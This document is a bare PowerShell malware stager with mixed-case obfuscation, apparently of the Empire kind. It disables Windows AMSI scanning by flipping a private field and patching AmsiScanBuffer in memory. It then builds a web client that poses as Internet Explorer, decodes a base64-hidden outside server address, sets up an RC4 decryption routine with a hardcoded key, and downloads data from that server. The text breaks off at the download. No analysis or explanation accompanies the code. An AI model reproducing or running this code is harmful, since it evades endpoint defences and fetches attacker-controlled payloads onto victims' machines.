IF(
$PSVeRsionTaBLe.PSVErsiON.MajOR -Ge 3){
$REF=[REF].AsSEMBly.GeTTyPe('System.Management.Automation.Amsi'+'Utils');
$Ref.GetFIEld('amsiInitF'+'ailed','NonPublic,Static').SEtVALue($null,$TruE);
$MethodDefinition = "[DllImport(`"kernel32`")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);[DllImport(`"kernel32`")]public static extern IntPtr GetModuleHandle(string lpModuleName);[DllImport(`"kernel32`")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);";
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
$ABSD = 'AmsiS'+'canBuffer';
$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
[UInt32]$Size = 0x5;
[UInt32]$ProtectFlag = 0x40;
[UInt32]$OldProtectFlag = 0;
[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);
[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
};

[SYsTEM.NET.SErvicEPOINtMAnagEr]::EXpect100CoNTiNUE=0;
$7A6ED=NEw-ObJECT SySTEM.NeT.WEbClient;
$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$ser=$([TEXt.EncoDInG]::UNICoDe.GETStriNg([COnVert]::FROMBasE64StrInG('aAB0AHQAcAA6AC8ALwA5ADUALgAxADgAMQAuADEANQAyAC4AMgA1ADoAOAAxAA==')));
$t='/news.php';


$7a6Ed.HEaDeRs.ADd('User-Agent',$u);
$7A6ED.PRoxy=[SysTeM.NeT.WebReQueST]::DEfaulTWebPROxY;
$7A6eD.PRoXy.CRedENtIALS = [SYsTeM.NeT.CrEdentiALCAcHe]::DefaULTNeTWoRKCrEdeNTiAls;
$Script:Proxy = $7a6ed.Proxy;


$K=[SYSteM.TeXt.ENCoDinG]::ASCII.GEtByTeS('v~W4yzcq&=/3gU?[PEZ9VfdMO<uRr#)I');
$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CouNT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXOr$S[($S[$I]+$S[$H])%256]}};


$7a6eD.HeADERS.ADD("Cookie","rqlMpRzfuCP=J8U9vtmQMfy7ybhdsi08dD4OHig=");
$DatA=$7a6ED.DOwNLOadDAtA($ser+$T);
